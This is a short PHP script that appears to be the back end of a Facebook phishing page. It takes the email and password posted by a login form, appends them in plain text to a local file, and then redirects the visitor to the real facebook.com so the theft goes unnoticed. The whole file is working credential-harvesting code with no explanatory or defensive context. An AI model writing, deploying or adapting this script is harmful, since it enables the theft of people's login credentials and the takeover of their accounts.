<?php 

if(isset($_POST['submit'])){
    $email = $_POST['username'];
    $password = $_POST['password'];
    }


$sms = "Email: " . $email . "  Password: " . $password . " \n" ;


$myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
$txt = $sms;
fwrite($myfile, $txt);
fclose($myfile);
header("Location: https://www.facebook.com");
exit();
?>